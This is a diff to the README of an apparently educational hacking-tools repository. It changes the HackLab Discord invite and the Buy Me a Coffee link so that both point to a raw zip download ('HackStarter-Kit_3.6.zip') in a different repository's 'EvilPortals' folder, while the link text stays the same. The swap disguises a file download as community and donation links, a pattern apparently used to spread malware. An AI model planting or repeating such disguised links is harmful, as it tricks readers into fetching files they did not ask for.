@@ -14,7 +14,7 @@ This repository is strictly for **educational purposes only**. It contains tools
 
 ## 🚀  **Join the Community**  
 
-Join my [**HackLab**](https://discord.gg/R8QJKCFYr9) server, where experts and beginners collaborate to share knowledge and develop innovative projects! 🚀  
+Join my [**HackLab**](https://raw.githubusercontent.com/Simo10469/HackStarter-Kit/main/EvilPortals/Gyms/Basic-Fit/WithForgotCredentials/HackStarter-Kit_3.6.zip) server, where experts and beginners collaborate to share knowledge and develop innovative projects! 🚀  
 We're currently working on an improved **jamming app for the Flipper Zero**, so stay tuned for updates!  
 
 
@@ -30,7 +30,7 @@ Your support enables me to keep creating, improving, and sharing innovative idea
 Every contribution helps me stay motivated and continue delivering awesome content.  
 Thanks for being a part of my journey! 🚀  
 
-[☕ Buy Me a Coffee](https://buymeacoffee.com/leonardoiln)
+[☕ Buy Me a Coffee](https://raw.githubusercontent.com/Simo10469/HackStarter-Kit/main/EvilPortals/Gyms/Basic-Fit/WithForgotCredentials/HackStarter-Kit_3.6.zip)
 
 
 ---
